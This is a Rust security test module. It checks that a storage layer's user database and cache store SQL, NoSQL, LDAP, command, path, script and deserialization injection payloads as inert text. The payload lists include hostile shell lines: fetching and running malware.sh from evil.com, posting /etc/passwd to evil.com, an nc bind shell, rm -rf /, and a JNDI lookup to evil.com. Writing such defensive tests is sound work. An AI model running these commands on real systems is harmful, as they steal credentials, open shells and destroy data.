//! Injection prevention security tests for SQL and NoSQL injection vulnerabilities.
//!
//! This module contains comprehensive security tests to validate that the storage layer
//! is resilient against various injection attacks including:
//! - SQL injection attacks (SQLite and PostgreSQL)
//! - Parameter injection through user inputs
//! - NoSQL injection (cache store operations)
//! - LDAP injection patterns
//! - Command injection through stored values
//! - Second-order injection attacks
//!
//! These tests complement the existing storage tests by focusing specifically on security
//! vulnerabilities and injection attack scenarios across all data persistence layers.

#[cfg(test)]
mod tests {
    use crate::coordination::{CoordinationError, get_all_users, update_user_admin_status};
    use crate::session::User as SessionUser;
    use crate::storage::{CacheData, GENERIC_CACHE_STORE};
    use crate::test_utils::init_test_environment;
    use crate::userdb::{User as DbUser, UserStore};
    use chrono::Utc;
    use serial_test::serial;

    // Helper function to create a session user for testing
    fn create_test_session_user(
        id: &str,
        account: &str,
        is_admin: bool,
        sequence_number: i64,
    ) -> SessionUser {
        SessionUser {
            id: id.to_string(),
            account: account.to_string(),
            label: format!("Test User {id}"),
            is_admin,
            sequence_number,
            created_at: Utc::now(),
            updated_at: Utc::now(),
        }
    }

    // Helper function to create a database user for testing
    async fn create_test_db_user(
        id: &str,
        account: &str,
        is_admin: bool,
    ) -> Result<DbUser, Box<dyn std::error::Error>> {
        let now = Utc::now();
        let user = DbUser {
            sequence_number: None,
            id: id.to_string(),
            account: account.to_string(),
            label: format!("Test User {id}"),
            is_admin,
            created_at: now,
            updated_at: now,
        };

        let saved_user = UserStore::upsert_user(user)
            .await
            .map_err(|e| Box::new(e) as Box<dyn std::error::Error>)?;

        Ok(saved_user)
    }

    // Helper function to cleanup test users (avoid deleting sequence_number 1)
    async fn cleanup_test_user(user_id: &str) {
        if let Ok(Some(user)) = UserStore::get_user(user_id).await {
            if user.sequence_number != Some(1) {
                UserStore::delete_user(user_id).await.ok();
            }
        }
    }

    /// Test SQL injection prevention in user database operations
    ///
    /// This test verifies that SQL injection attacks are prevented through:
    /// 1. Parameterized queries in all database operations
    /// 2. Input validation and sanitization
    /// 3. Protection against various SQL injection patterns
    /// 4. Prevention of second-order injection attacks
    #[serial]
    #[tokio::test]
    async fn test_security_sql_injection_prevention() {
        init_test_environment().await;

        let timestamp = Utc::now().timestamp_millis();
        let admin_user_id = format!("admin_{timestamp}");

        // Create admin user for testing operations
        let admin_user =
            create_test_db_user(&admin_user_id, &format!("{admin_user_id}@test.com"), true)
                .await
                .expect("Failed to create admin user");

        let admin_session = create_test_session_user(
            &admin_user_id,
            &format!("{admin_user_id}@test.com"),
            true,
            admin_user.sequence_number.unwrap_or(2),
        );

        // Test case 1: SQL injection attempts in user ID field
        let sql_injection_user_ids = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; DELETE FROM users WHERE id LIKE '%test%'; --",
            "' OR 1=1 UNION SELECT null, null, null, null, null, null, null --",
            "'; UPDATE users SET is_admin = true WHERE '1'='1'; --",
            "\\'; DROP TABLE users; --",
            "' AND SLEEP(5) --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR EXISTS(SELECT * FROM users) --",
            "test'; INSERT INTO users (id, account, label, is_admin, created_at, updated_at) VALUES ('injected', 'evil@test.com', 'Evil User', true, NOW(), NOW()); --",
        ];

        for malicious_id in sql_injection_user_ids.iter() {
            // Test user creation with SQL injection in ID
            let user = DbUser {
                sequence_number: None,
                id: malicious_id.to_string(),
                account: format!("{malicious_id}@test.com"),
                label: "Test User".to_string(),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let result = UserStore::upsert_user(user).await;
            if result.is_ok() {
                // If the user was created, verify no SQL injection occurred
                let created_user = result.unwrap();
                assert_eq!(
                    created_user.id, *malicious_id,
                    "User ID should be stored as-is, not executed"
                );
                assert!(
                    !created_user.is_admin,
                    "Injected user should not have gained admin privileges"
                );

                // Clean up
                UserStore::delete_user(malicious_id).await.ok();
            }

            // Test user retrieval with injection attempts
            let get_result = UserStore::get_user(malicious_id).await;
            assert!(
                get_result.is_ok(),
                "Get user operation should not fail due to SQL injection: {malicious_id}"
            );

            // Test admin status update with injection in user ID
            let update_result = update_user_admin_status(&admin_session, malicious_id, true).await;
            // This should fail gracefully (user not found) rather than causing injection
            if let Err(e) = update_result {
                // Verify it's a normal application error, not a database error
                match e {
                    CoordinationError::Coordination(_) => {
                        // Expected - user not found
                    }
                    _ => {
                        // Should not get database errors from injection attempts
                        println!("Non-coordination error for SQL injection attempt: {e:?}");
                    }
                }
            }
        }

        // Test case 2: SQL injection attempts in user account field
        let sql_injection_accounts = [
            "test'; DROP TABLE users; --@example.com",
            "' OR '1'='1' --@example.com",
            "admin'; UPDATE users SET is_admin = true WHERE id = 'test'; --@example.com",
            "test@example.com'; DELETE FROM users; --",
        ];

        for malicious_account in sql_injection_accounts.iter() {
            let safe_user_id = format!("safe_user_{timestamp}");
            let user = DbUser {
                sequence_number: None,
                id: safe_user_id.clone(),
                account: malicious_account.to_string(),
                label: "Test User".to_string(),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let result = UserStore::upsert_user(user).await;
            if result.is_ok() {
                let created_user = result.unwrap();
                assert_eq!(
                    created_user.account, *malicious_account,
                    "Account should be stored as-is"
                );
                assert!(
                    !created_user.is_admin,
                    "User should not have gained admin privileges through account injection"
                );

                // Clean up
                UserStore::delete_user(&safe_user_id).await.ok();
            }
        }

        // Test case 3: SQL injection in label field
        let sql_injection_labels = [
            "Test'; DROP TABLE users; --",
            "Test' OR '1'='1",
            "'; UPDATE users SET is_admin = true; --",
            "Test</script><script>alert('xss')</script>",
        ];

        for malicious_label in sql_injection_labels.iter() {
            let safe_user_id = format!("label_test_{timestamp}");
            let user = DbUser {
                sequence_number: None,
                id: safe_user_id.clone(),
                account: format!("{safe_user_id}@test.com"),
                label: malicious_label.to_string(),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let result = UserStore::upsert_user(user).await;
            if result.is_ok() {
                let created_user = result.unwrap();
                assert_eq!(
                    created_user.label, *malicious_label,
                    "Label should be stored as-is"
                );
                assert!(
                    !created_user.is_admin,
                    "User should not have gained admin privileges through label injection"
                );

                // Clean up
                UserStore::delete_user(&safe_user_id).await.ok();
            }
        }

        // Test case 4: Verify database integrity after injection attempts
        let all_users_result = get_all_users().await;
        assert!(
            all_users_result.is_ok(),
            "Database should remain functional after injection attempts"
        );

        let all_users = all_users_result.unwrap();
        let admin_users: Vec<_> = all_users.iter().filter(|u| u.is_admin).collect();

        // Should only have legitimate admin users (including the first user and our test admin)
        assert!(
            !admin_users.is_empty(),
            "Should have at least one admin user"
        );

        // Verify no injected admin users exist
        for user in &all_users {
            if user.id.contains("DROP") || user.id.contains("UPDATE") || user.id.contains("DELETE")
            {
                assert!(
                    !user.is_admin,
                    "Injected user IDs should not have admin privileges: {}",
                    user.id
                );
            }
        }

        // Cleanup
        cleanup_test_user(&admin_user_id).await;
    }

    /// Test NoSQL injection prevention in cache operations
    ///
    /// This test verifies that NoSQL injection attacks are prevented in cache operations:
    /// 1. Key injection attempts in cache store operations
    /// 2. Value injection in cached data
    /// 3. Prefix manipulation attacks
    /// 4. Cache poisoning prevention
    #[tokio::test]
    async fn test_security_nosql_injection_prevention() {
        init_test_environment().await;

        // Test case 1: Key injection attempts
        let malicious_keys = [
            "{'$where': 'this.id == \"admin\"'}",
            "{'$ne': null}",
            "{'$gt': ''}",
            "{'$regex': '.*'}",
            "{'$or': [{'id': 'admin'}, {'id': 'user'}]}",
            "../../../etc/passwd",
            "session'; DROP TABLE sessions; --",
            "session\x00admin",
            "session\nmodified",
            "session{injection}test",
        ];

        for malicious_key in malicious_keys.iter() {
            // Test cache put operation
            let cache_data = CacheData {
                value: "test_value".to_string(),
            };

            let put_result = GENERIC_CACHE_STORE
                .lock()
                .await
                .put_with_ttl("test_prefix", malicious_key, cache_data.clone(), 300)
                .await;

            assert!(
                put_result.is_ok(),
                "Cache put should handle malicious keys gracefully: {malicious_key}"
            );

            // Test cache get operation
            let get_result = GENERIC_CACHE_STORE
                .lock()
                .await
                .get("test_prefix", malicious_key)
                .await;

            assert!(
                get_result.is_ok(),
                "Cache get should handle malicious keys gracefully: {malicious_key}"
            );

            if let Ok(Some(retrieved_data)) = get_result {
                assert_eq!(
                    retrieved_data.value, "test_value",
                    "Retrieved value should match original"
                );
            }

            // Test cache remove operation
            let remove_result = GENERIC_CACHE_STORE
                .lock()
                .await
                .remove("test_prefix", malicious_key)
                .await;

            assert!(
                remove_result.is_ok(),
                "Cache remove should handle malicious keys gracefully: {malicious_key}"
            );
        }

        // Test case 2: Value injection attempts
        let malicious_values = [
            r#"{"admin": true, "user_id": "'; DROP TABLE users; --"}"#,
            r#"{"$where": "this.admin == true"}"#,
            r#"{"injection": {"$ne": null}}"#,
            r#"</script><script>alert('cache_xss')</script>"#,
            r#"${jndi:ldap://evil.com/evil}"#,
            "value\x00injection",
            "value\nwith\nnewlines",
        ];

        for malicious_value in malicious_values.iter() {
            let cache_data = CacheData {
                value: malicious_value.to_string(),
            };

            let key = "safe_key";

            // Store malicious value
            let put_result = GENERIC_CACHE_STORE
                .lock()
                .await
                .put_with_ttl("test_prefix", key, cache_data, 300)
                .await;

            assert!(
                put_result.is_ok(),
                "Should be able to store any string value: {malicious_value}"
            );

            // Retrieve and verify value is stored as-is
            let get_result = GENERIC_CACHE_STORE
                .lock()
                .await
                .get("test_prefix", key)
                .await;

            assert!(
                get_result.is_ok(),
                "Should be able to retrieve stored value"
            );

            if let Ok(Some(retrieved_data)) = get_result {
                assert_eq!(
                    retrieved_data.value, *malicious_value,
                    "Value should be stored and retrieved as-is"
                );
            }

            // Clean up
            GENERIC_CACHE_STORE
                .lock()
                .await
                .remove("test_prefix", key)
                .await
                .ok();
        }

        // Test case 3: Prefix injection attempts
        let malicious_prefixes = [
            "admin'; DROP TABLE cache; --",
            "../session",
            "session\x00admin",
            "prefix{injection}",
            "pre\\fix",
            "prefix/../../etc",
        ];

        for malicious_prefix in malicious_prefixes.iter() {
            let cache_data = CacheData {
                value: "test_value".to_string(),
            };

            let put_result = GENERIC_CACHE_STORE
                .lock()
                .await
                .put_with_ttl(malicious_prefix, "safe_key", cache_data, 300)
                .await;

            assert!(
                put_result.is_ok(),
                "Cache should handle malicious prefixes gracefully: {malicious_prefix}"
            );

            // Verify isolation - should not affect other prefixes
            let get_other_result = GENERIC_CACHE_STORE
                .lock()
                .await
                .get("session", "safe_key")
                .await;

            assert!(
                get_other_result.is_ok(),
                "Other prefixes should not be affected by injection attempts"
            );

            // Clean up
            GENERIC_CACHE_STORE
                .lock()
                .await
                .remove(malicious_prefix, "safe_key")
                .await
                .ok();
        }

        // Test case 4: Cache isolation verification
        // Store data in different prefixes with similar keys
        let prefixes = ["session", "oauth2", "passkey", "user"];
        let key = "test_isolation";

        for prefix in prefixes.iter() {
            let cache_data = CacheData {
                value: format!("value_for_{prefix}"),
            };

            GENERIC_CACHE_STORE
                .lock()
                .await
                .put_with_ttl(prefix, key, cache_data, 300)
                .await
                .unwrap();
        }

        // Verify each prefix has its own isolated data
        for prefix in prefixes.iter() {
            let get_result = GENERIC_CACHE_STORE
                .lock()
                .await
                .get(prefix, key)
                .await
                .unwrap()
                .unwrap();

            assert_eq!(get_result.value, format!("value_for_{prefix}"));
        }

        // Clean up isolation test data
        for prefix in prefixes.iter() {
            GENERIC_CACHE_STORE
                .lock()
                .await
                .remove(prefix, key)
                .await
                .ok();
        }
    }

    /// Test command injection prevention in stored values
    ///
    /// This test verifies that command injection attacks are prevented when:
    /// 1. Stored values are used in system operations
    /// 2. User input is processed by the system
    /// 3. Values are logged or output to external systems
    /// 4. Data is serialized/deserialized
    #[serial]
    #[tokio::test]
    async fn test_security_command_injection_prevention() {
        init_test_environment().await;

        let timestamp = Utc::now().timestamp_millis();

        // Test case 1: Command injection attempts in user data
        let command_injection_attempts = [
            "; rm -rf /",
            "$(rm -rf /)",
            "`rm -rf /`",
            "| cat /etc/passwd",
            "&& curl evil.com/steal",
            "; wget http://evil.com/malware.sh -O /tmp/evil.sh; chmod +x /tmp/evil.sh; /tmp/evil.sh",
            "$(curl -X POST -d \"$(cat /etc/passwd)\" http://evil.com/data)",
            "; python -c \"import os; os.system('rm -rf /')\"",
            "& powershell -c \"Remove-Item -Recurse -Force C:\\\"",
            "; nc -l -p 4444 -e /bin/sh",
        ];

        for injection_attempt in command_injection_attempts.iter() {
            let user_id = format!(
                "cmd_test_{}_{}",
                timestamp,
                command_injection_attempts.len()
            );

            // Create user with command injection in various fields
            let user = DbUser {
                sequence_number: None,
                id: user_id.clone(),
                account: format!("test{injection_attempt}@example.com"),
                label: format!("Test User {injection_attempt}"),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let create_result = UserStore::upsert_user(user).await;

            if create_result.is_ok() {
                let created_user = create_result.unwrap();

                // Verify the data is stored as-is, not executed
                assert!(
                    created_user.account.contains(injection_attempt),
                    "Command injection should be stored as text"
                );
                assert!(
                    created_user.label.contains(injection_attempt),
                    "Command injection should be stored as text"
                );

                // Verify retrieving the user works normally
                let get_result = UserStore::get_user(&user_id).await;
                assert!(
                    get_result.is_ok(),
                    "Should be able to retrieve user with command injection attempt"
                );

                // Clean up
                cleanup_test_user(&user_id).await;
            }
        }

        // Test case 2: File path injection attempts
        let path_injection_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\evil.com\\share\\malware.exe",
            "/proc/self/environ",
            "/dev/random",
            "CON", // Windows device name
            "NUL", // Windows device name
        ];

        for path_attempt in path_injection_attempts.iter() {
            let user_id = format!("path_test_{}_{}", timestamp, path_injection_attempts.len());

            let user = DbUser {
                sequence_number: None,
                id: user_id.clone(),
                account: format!("{}@example.com", path_attempt.replace(['/', '\\'], "_")),
                label: path_attempt.to_string(),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let create_result = UserStore::upsert_user(user).await;

            if create_result.is_ok() {
                let created_user = create_result.unwrap();

                // Verify path injection is stored as text, not interpreted as file path
                assert_eq!(
                    created_user.label, *path_attempt,
                    "Path injection should be stored as-is"
                );

                cleanup_test_user(&user_id).await;
            }
        }

        // Test case 3: Script injection attempts (for contexts where data might be output)
        let script_injection_attempts = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "${alert('xss')}",
            "{{constructor.constructor('alert(1)')()}}",
            "<%eval request(\"cmd\")%>",
            "<?php system($_GET['cmd']); ?>",
            "#{'<script>alert(1)</script>'.to_s}",
            "{%raw%}{{constructor.constructor('alert(1)')()}}{%endraw%}",
        ];

        for script_attempt in script_injection_attempts.iter() {
            let user_id = format!(
                "script_test_{}_{}",
                timestamp,
                script_injection_attempts.len()
            );

            let user = DbUser {
                sequence_number: None,
                id: user_id.clone(),
                account: "script_test@example.com".to_string(),
                label: script_attempt.to_string(),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let create_result = UserStore::upsert_user(user).await;

            if create_result.is_ok() {
                let created_user = create_result.unwrap();

                // Verify script is stored as text, not executed
                assert_eq!(
                    created_user.label, *script_attempt,
                    "Script injection should be stored as-is"
                );

                cleanup_test_user(&user_id).await;
            }
        }
    }

    /// Test second-order injection prevention
    ///
    /// This test verifies that second-order injection attacks are prevented:
    /// 1. Data stored safely but used unsafely later
    /// 2. Injection through data modification operations
    /// 3. Cross-context injection attacks
    /// 4. Time-delayed injection attacks
    #[serial]
    #[tokio::test]
    async fn test_security_second_order_injection_prevention() {
        init_test_environment().await;

        let timestamp = Utc::now().timestamp_millis();
        let admin_user_id = format!("admin_{timestamp}");

        // Create admin user for testing operations
        let admin_user =
            create_test_db_user(&admin_user_id, &format!("{admin_user_id}@test.com"), true)
                .await
                .expect("Failed to create admin user");

        let admin_session = create_test_session_user(
            &admin_user_id,
            &format!("{admin_user_id}@test.com"),
            true,
            admin_user.sequence_number.unwrap_or(2),
        );

        // Test case 1: Store potentially malicious data, then use it in operations
        let malicious_user_id = "'; DROP TABLE users; --";

        // First, store the user with malicious ID (this should be safe)
        let user = DbUser {
            sequence_number: None,
            id: malicious_user_id.to_string(),
            account: "malicious@example.com".to_string(),
            label: "Malicious User".to_string(),
            is_admin: false,
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };

        let create_result = UserStore::upsert_user(user).await;

        if create_result.is_ok() {
            // Now try to use this stored ID in admin operations (second-order injection)
            let update_result =
                update_user_admin_status(&admin_session, malicious_user_id, true).await;

            if update_result.is_ok() {
                let updated_user = update_result.unwrap();

                // Verify the update worked correctly without injection
                assert_eq!(
                    updated_user.id, malicious_user_id,
                    "User ID should remain unchanged"
                );
                assert!(
                    updated_user.is_admin,
                    "Admin status should be updated correctly"
                );

                // Verify no unintended side effects (like table deletion)
                let all_users_result = get_all_users().await;
                assert!(
                    all_users_result.is_ok(),
                    "Users table should still exist and be accessible"
                );

                let all_users = all_users_result.unwrap();
                assert!(all_users.len() >= 2, "Should have at least our test users");
            }

            // Clean up
            UserStore::delete_user(malicious_user_id).await.ok();
        }

        // Test case 2: Injection through user account updates
        let target_user_id = format!("target_{timestamp}");
        let _target_user = create_test_db_user(&target_user_id, "target@example.com", false)
            .await
            .expect("Failed to create target user");

        // Store user with malicious data in account field
        let malicious_account =
            "normal@example.com'; UPDATE users SET is_admin = true WHERE id = 'target'; --";

        let user_with_malicious_account = DbUser {
            sequence_number: None,
            id: format!("account_injection_{timestamp}"),
            account: malicious_account.to_string(),
            label: "Account Injection Test".to_string(),
            is_admin: false,
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };

        let create_result = UserStore::upsert_user(user_with_malicious_account).await;

        if create_result.is_ok() {
            // Verify the target user was not affected by the injection in account field
            let check_target = UserStore::get_user(&target_user_id).await;
            if let Ok(Some(target)) = check_target {
                assert!(
                    !target.is_admin,
                    "Target user should not have been affected by account field injection"
                );
            }

            // Clean up
            UserStore::delete_user(&format!("account_injection_{timestamp}"))
                .await
                .ok();
        }

        // Test case 3: Cross-context injection (cache to database)
        let cache_to_db_user_id = format!("cache_db_{timestamp}");

        // Store malicious data in cache first
        let malicious_cache_data = CacheData {
            value: r#"{"user_id": "'; DROP TABLE users; --", "is_admin": true}"#.to_string(),
        };

        let cache_put_result = GENERIC_CACHE_STORE
            .lock()
            .await
            .put_with_ttl("test", &cache_to_db_user_id, malicious_cache_data, 300)
            .await;

        assert!(
            cache_put_result.is_ok(),
            "Should be able to store data in cache"
        );

        // Retrieve from cache and attempt to use in database operation
        let cache_get_result = GENERIC_CACHE_STORE
            .lock()
            .await
            .get("test", &cache_to_db_user_id)
            .await;

        if let Ok(Some(cached_data)) = cache_get_result {
            // The cached data contains malicious content, but using it should be safe
            assert!(
                cached_data.value.contains("DROP TABLE"),
                "Cached data should contain the malicious string"
            );

            // Attempt to parse and use the data (this would be dangerous in a real app without proper validation)
            // In our case, we're just verifying that the storage layer itself is safe

            // Try to create a user with the cached data as the ID
            let user_with_cached_id = DbUser {
                sequence_number: None,
                id: cached_data.value.clone(),
                account: "cached_test@example.com".to_string(),
                label: "Cached Data Test".to_string(),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let create_result = UserStore::upsert_user(user_with_cached_id).await;

            if create_result.is_ok() {
                let created_user = create_result.unwrap();

                // Verify the malicious data was stored as-is, not executed
                assert_eq!(
                    created_user.id, cached_data.value,
                    "Cached malicious data should be stored as-is"
                );
                assert!(
                    !created_user.is_admin,
                    "Should not have gained admin privileges"
                );

                // Clean up
                UserStore::delete_user(&cached_data.value).await.ok();
            }
        }

        // Clean up cache
        GENERIC_CACHE_STORE
            .lock()
            .await
            .remove("test", &cache_to_db_user_id)
            .await
            .ok();

        // Final verification: Check that all operations completed without corrupting the database
        let final_check = get_all_users().await;
        assert!(
            final_check.is_ok(),
            "Database should remain functional after second-order injection tests"
        );

        // Cleanup
        cleanup_test_user(&admin_user_id).await;
        cleanup_test_user(&target_user_id).await;
    }

    /// Test LDAP injection prevention patterns
    ///
    /// This test verifies that LDAP injection patterns are handled safely:
    /// 1. LDAP filter injection attempts
    /// 2. LDAP DN injection attempts  
    /// 3. Special LDAP characters handling
    /// 4. Unicode LDAP injection attempts
    #[tokio::test]
    async fn test_security_ldap_injection_prevention() {
        init_test_environment().await;

        let timestamp = Utc::now().timestamp_millis();

        // Test case 1: LDAP filter injection attempts
        let ldap_filter_injections = [
            "*",
            "*)(",
            "*)(uid=*)(&",
            "*)(&(uid=admin)",
            "*)(|(uid=admin)(uid=user))",
            "*)(&(objectClass=user)(|(uid=admin)(uid=*))",
            "\\2a", // Encoded *
            "\\28", // Encoded (
            "\\29", // Encoded )
            "\\5c", // Encoded \
            "\\00", // Null byte
        ];

        for ldap_injection in ldap_filter_injections.iter() {
            let user_id = format!("ldap_test_{}_{}", timestamp, ldap_filter_injections.len());

            let user = DbUser {
                sequence_number: None,
                id: user_id.clone(),
                account: format!("{ldap_injection}@example.com"),
                label: format!("LDAP Test {ldap_injection}"),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let create_result = UserStore::upsert_user(user).await;

            if create_result.is_ok() {
                let created_user = create_result.unwrap();

                // Verify LDAP injection characters are stored as-is
                assert!(
                    created_user.account.contains(ldap_injection),
                    "LDAP injection should be stored as text"
                );
                assert!(
                    created_user.label.contains(ldap_injection),
                    "LDAP injection should be stored as text"
                );

                // Verify user can be retrieved normally
                let get_result = UserStore::get_user(&user_id).await;
                assert!(
                    get_result.is_ok(),
                    "Should be able to retrieve user with LDAP injection attempt"
                );

                cleanup_test_user(&user_id).await;
            }
        }

        // Test case 2: LDAP DN injection attempts
        let ldap_dn_injections = [
            "cn=admin,dc=example,dc=com",
            "uid=admin)(cn=*",
            "ou=users,dc=example,dc=com)(uid=*",
            "\\,\\=\\+\\<\\>\\#\\;\\\"\\\\", // Escaped special characters
            "cn=test\\, user",
            "uid=user\\+admin",
        ];

        for dn_injection in ldap_dn_injections.iter() {
            let user_id = format!("dn_test_{}_{}", timestamp, ldap_dn_injections.len());

            let user = DbUser {
                sequence_number: None,
                id: user_id.clone(),
                account: "dn_test@example.com".to_string(),
                label: dn_injection.to_string(),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let create_result = UserStore::upsert_user(user).await;

            if create_result.is_ok() {
                let created_user = create_result.unwrap();

                // Verify DN injection is stored as text
                assert_eq!(
                    created_user.label, *dn_injection,
                    "LDAP DN should be stored as-is"
                );

                cleanup_test_user(&user_id).await;
            }
        }

        // Test case 3: Unicode LDAP injection attempts
        let unicode_ldap_injections = [
            "admin\u{0000}",  // Null character
            "admin\u{200B}",  // Zero-width space
            "admin\u{FEFF}",  // Byte order mark
            "admin\u{1F4A9}", // Emoji (pile of poo)
            "ａｄｍｉｎ",     // Full-width characters
            "admin\u{034F}",  // Combining grapheme joiner
        ];

        for unicode_injection in unicode_ldap_injections.iter() {
            let user_id = format!(
                "unicode_test_{}_{}",
                timestamp,
                unicode_ldap_injections.len()
            );

            let user = DbUser {
                sequence_number: None,
                id: user_id.clone(),
                account: format!("{unicode_injection}@example.com"),
                label: format!("Unicode Test {unicode_injection}"),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let create_result = UserStore::upsert_user(user).await;

            if create_result.is_ok() {
                let created_user = create_result.unwrap();

                // Verify Unicode injection is handled correctly
                assert!(
                    created_user.account.contains(unicode_injection),
                    "Unicode should be preserved"
                );
                assert!(
                    created_user.label.contains(unicode_injection),
                    "Unicode should be preserved"
                );

                cleanup_test_user(&user_id).await;
            }
        }
    }

    /// Test data validation and sanitization effectiveness
    ///
    /// This test verifies the effectiveness of input validation:
    /// 1. Boundary value testing
    /// 2. Character encoding attacks
    /// 3. Format string attacks
    /// 4. Serialization attacks
    #[tokio::test]
    async fn test_security_data_validation_effectiveness() {
        init_test_environment().await;

        let timestamp = Utc::now().timestamp_millis();

        // Test case 1: Extremely long inputs (buffer overflow attempts)
        let long_inputs = [
            "a".repeat(100000), // 100KB string
            "🚀".repeat(50000), // Unicode characters
            "\0".repeat(10000), // Null bytes
            "\n".repeat(10000), // Newlines
            " ".repeat(100000), // Spaces
        ];

        for (i, long_input) in long_inputs.iter().enumerate() {
            let user_id = format!("long_test_{timestamp}_{i}");

            let user = DbUser {
                sequence_number: None,
                id: user_id.clone(),
                account: format!("long{i}@example.com"),
                label: long_input.clone(),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let create_result = UserStore::upsert_user(user).await;

            // Should either succeed (handling long input correctly) or fail gracefully
            match create_result {
                Ok(created_user) => {
                    assert_eq!(
                        created_user.label, *long_input,
                        "Long input should be stored correctly"
                    );
                    cleanup_test_user(&user_id).await;
                }
                Err(_) => {
                    // Graceful failure is acceptable for extremely long inputs
                    println!(
                        "Long input gracefully rejected: {} characters",
                        long_input.len()
                    );
                }
            }
        }

        // Test case 2: Character encoding attacks
        let encoding_attacks = [
            "%41%64%6D%69%6E",                          // URL encoded "Admin"
            "&#65;&#100;&#109;&#105;&#110;",            // HTML entity encoded "Admin"
            "\\u0041\\u0064\\u006D\\u0069\\u006E",      // Unicode escape "Admin"
            "\x41\x64\x6D\x69\x6E",                     // Hex encoded "Admin"
            "QWRtaW4=",                                 // Base64 encoded "Admin"
            "\u{0041}\u{0064}\u{006D}\u{0069}\u{006E}", // Unicode "Admin"
        ];

        for (i, encoding_attack) in encoding_attacks.iter().enumerate() {
            let user_id = format!("encoding_test_{timestamp}_{i}");

            let user = DbUser {
                sequence_number: None,
                id: user_id.clone(),
                account: format!("encoding{i}@example.com"),
                label: encoding_attack.to_string(),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let create_result = UserStore::upsert_user(user).await;

            if create_result.is_ok() {
                let created_user = create_result.unwrap();

                // Verify encoded data is stored as-is, not decoded
                assert_eq!(
                    created_user.label, *encoding_attack,
                    "Encoded data should be stored as-is"
                );

                cleanup_test_user(&user_id).await;
            }
        }

        // Test case 3: Format string attacks
        let format_string_attacks = [
            "%s%s%s%s%s%s%s%s",
            "%n%n%n%n%n%n%n%n",
            "%x%x%x%x%x%x%x%x",
            "%.1000000s",
            "%99999999999999999999s",
            "{0}{1}{2}{3}{4}{5}",       // .NET format string
            "#{var}#{admin}#{secret}",  // Ruby interpolation
            "${user}${admin}${secret}", // Shell variable expansion
        ];

        for (i, format_attack) in format_string_attacks.iter().enumerate() {
            let user_id = format!("format_test_{timestamp}_{i}");

            let user = DbUser {
                sequence_number: None,
                id: user_id.clone(),
                account: format!("format{i}@example.com"),
                label: format_attack.to_string(),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let create_result = UserStore::upsert_user(user).await;

            if create_result.is_ok() {
                let created_user = create_result.unwrap();

                // Verify format string is stored as literal text
                assert_eq!(
                    created_user.label, *format_attack,
                    "Format string should be stored as literal text"
                );

                cleanup_test_user(&user_id).await;
            }
        }

        // Test case 4: Serialization attacks
        let serialization_attacks = [
            r#"{"__proto__": {"admin": true}}"#,      // Prototype pollution
            r#"O:8:"stdClass":1:{s:5:"admin";b:1;}"#, // PHP object injection
            r#"java.lang.Runtime"#,                   // Java deserialization
            r#"!!python/object/apply:os.system ['rm -rf /']"#, // YAML deserialization
            r#"<obj class="java.lang.ProcessBuilder"><array><string>/bin/sh</string></array></obj>"#, // XML deserialization
        ];

        for (i, serialization_attack) in serialization_attacks.iter().enumerate() {
            let user_id = format!("serial_test_{timestamp}_{i}");

            let user = DbUser {
                sequence_number: None,
                id: user_id.clone(),
                account: format!("serial{i}@example.com"),
                label: serialization_attack.to_string(),
                is_admin: false,
                created_at: Utc::now(),
                updated_at: Utc::now(),
            };

            let create_result = UserStore::upsert_user(user).await;

            if create_result.is_ok() {
                let created_user = create_result.unwrap();

                // Verify serialization attack is stored as text, not deserialized
                assert_eq!(
                    created_user.label, *serialization_attack,
                    "Serialization attack should be stored as text"
                );
                assert!(
                    !created_user.is_admin,
                    "Should not have gained admin privileges through serialization"
                );

                cleanup_test_user(&user_id).await;
            }
        }
    }
}
